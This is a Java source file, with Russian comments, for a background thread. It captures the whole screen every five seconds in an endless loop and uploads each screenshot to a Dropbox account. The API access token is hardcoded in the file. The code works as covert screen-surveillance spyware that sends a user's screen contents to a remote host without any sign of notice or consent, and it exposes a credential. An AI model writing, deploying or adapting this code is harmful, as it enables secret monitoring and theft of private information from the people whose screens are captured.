import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;

public class MyThread extends Thread
{
    DbxRequestConfig config;
    DbxClientV2 client;
    String fileName;

    public MyThread()
    {
        config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        client = new DbxClientV2(config, "9zVStlVnY10AAAAAAAAIPtlb3krmeEiuzqyCFCKsBIQwo5FELobV0Uiitb31eVh0");
    }

    public void run()
    {
        //for (int i = 0; i < 6; i++)//заменить на бесконечный цикл
        while (true)
        {
            try {
                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                //сохраняем точное время скриншота
                fileName = new Today().getDate() + ".png";

                //записываем изображение из буфера в байтовый поток
                ByteArrayOutputStream bao = new ByteArrayOutputStream();
                ImageIO.write(image, "png", bao);

                //читаем в поток массив байтов
                InputStream in = new ByteArrayInputStream(bao.toByteArray());
                client.files()
                        .uploadBuilder("/" + fileName)
                        .uploadAndFinish(in);

                sleep(5000);
            }
            catch (Exception e) {
                e.printStackTrace();
            }

        }
    }
}
